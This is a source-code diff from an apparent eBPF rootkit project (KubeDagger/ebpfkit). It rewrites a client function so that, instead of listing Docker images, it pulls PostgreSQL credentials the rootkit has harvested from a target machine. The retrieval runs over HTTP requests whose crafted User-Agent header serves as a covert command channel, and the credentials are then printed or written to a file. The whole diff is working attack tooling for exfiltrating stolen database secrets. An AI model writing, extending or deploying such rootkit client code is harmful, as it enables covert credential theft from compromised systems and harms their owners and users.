@@ -14,7 +14,7 @@ See the License for the specific language governing permissions and
 limitations under the License.
 */
 
-package docker
+package postgres
 
 import (
 	"fmt"
@@ -27,11 +27,11 @@ import (
 
 	"github.com/sirupsen/logrus"
 
-	"github.com/yasindce1998/KubeDagger/cmd/KubeDagger-client/run/utils"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/utils"
 )
 
-// SendGetImagesListRequest sends a request list all the images detected by the rootkit
-func SendGetImagesListRequest(target string, output string) error {
+// SendGetPostgresSecretsListRequest sends a request list all the postgresql secrets detected by the rootkit
+func SendGetPostgresSecretsListRequest(target string, output string) error {
 	if len(output) > 0 {
 		d := path.Dir(output)
 		_ = os.MkdirAll(d, 0664)
@@ -42,8 +42,8 @@ func SendGetImagesListRequest(target string, output string) error {
 		_ = f.Close()
 	}
 
-	file := "/ebpfkit/images_list"
-	nextFile := "/ebpfkit/images_list"
+	file := "/ebpfkit/pg_credentials"
+	nextFile := "/ebpfkit/pg_credentials"
 	var done bool
 	var data string
 	firstTry := true
@@ -55,7 +55,7 @@ func SendGetImagesListRequest(target string, output string) error {
 			logrus.Fatalf("couldn't create HTTP request: %v", err)
 		}
 
-		req.Header.Set("User-Agent", buildUserAgent(nextFile, false, false))
+		req.Header.Set("User-Agent", buildFSWatchUserAgent(nextFile, false, false))
 
 		if file == nextFile && firstTry {
 			firstTry = false
@@ -78,7 +78,7 @@ func SendGetImagesListRequest(target string, output string) error {
 			continue
 		}
 
-		data += strings.Trim(string(body[:len(body)-6]), "_")
+		data += strings.Join(strings.Split(strings.Trim(string(body[:len(body)-6]), "_"), "#"), " ")
 
 		if body[len(body)-5] == '_' {
 			done = true
@@ -90,7 +90,7 @@ func SendGetImagesListRequest(target string, output string) error {
 	}
 
 	if len(output) == 0 {
-		logrus.Printf("Showing the list of images detected on the target system:\n%s\n", data)
+		logrus.Printf("Showing the list of Postgresql credentials detected on the target system:\n%s\n", data)
 	} else {
 		if err := ioutil.WriteFile(output, []byte(data), 0664); err != nil {
 			logrus.Fatalf("couldn't write data in output file: %s", err)
